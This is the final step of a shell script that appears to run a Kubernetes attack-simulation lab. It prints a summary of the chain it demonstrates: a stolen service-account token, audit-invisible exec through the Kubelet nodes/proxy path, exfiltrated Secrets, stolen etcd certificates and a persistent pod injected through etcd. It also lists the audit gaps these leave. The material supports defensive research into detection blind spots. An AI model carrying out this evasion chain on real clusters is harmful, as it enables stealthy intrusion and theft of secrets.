printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Verify Results  ===" "${RESET}"

step "Attack summary"

printf "\n%s%s%s\n" "${BOLD}" "FULL ATTACK CHAIN COMPLETE" "${RESET}"
printf "%s\n" "====================================================================="
printf "  ${GREEN}[1]${RESET}  RCE on web app - SA token stolen\n"
printf "  ${GREEN}[2]${RESET}  nodes/proxy permission discovered (pods/exec DENIED)\n"
printf "  ${GREEN}[3]${RESET}  Audit-invisible exec via Kubelet WebSocket (cross-namespace)\n"
printf "  ${GREEN}[4]${RESET}  Stolen SA token -> K8s Secrets exfiltrated\n"
if [ "$ETCD_AVAILABLE" -eq 1 ] && [ -n "$KUBETCD_BIN" ]; then
  printf "  ${GREEN}[5a]${RESET} etcd certs stolen from kube-apiserver via Kubelet exec\n"
  printf "  ${GREEN}[5b]${RESET} Persistent pod injected via etcd (zero audit trail)\n"
elif [ "$ETCD_AVAILABLE" -eq 1 ]; then
  printf "  ${GREEN}[5a]${RESET} etcd certs stolen from kube-apiserver via Kubelet exec\n"
  printf "  ${YELLOW}[5b]${RESET} kubetcd not configured - injection skipped\n"
else
  printf "  ${YELLOW}[5]${RESET}  etcd step skipped (managed K8s - no control plane access)\n"
fi
printf "  ${GREEN}[6]${RESET}  Results verified\n"
printf "%s\n" "====================================================================="
printf "\n"
printf "%s%s%s\n" "${BOLD}${RED}" "AUDIT GAPS DEMONSTRATED" "${RESET}"
printf "  1. nodes/proxy exec: recorded as GET, not pods/exec\n"
printf "     -> SIEM rules monitoring pods/exec MISS this entirely\n"
if [ "$ETCD_AVAILABLE" -eq 1 ] && [ -n "$KUBETCD_BIN" ]; then
  printf "  2. etcd injection: ZERO audit log entries\n"
  printf "     -> Pod exists but no record of who created it\n"
  printf "     -> kubectl delete fails (persistence via fake namespace)\n"
fi
printf "\n"

# Cleanup temp kubeconfig
rm -f "$TMPKUBECONFIG"

step "Cleanup reminder"
info "See README.md for full cleanup instructions."

printf "\n%s%s%s\n\n" "${BOLD}${GREEN}" "Attack simulation complete." "${RESET}"
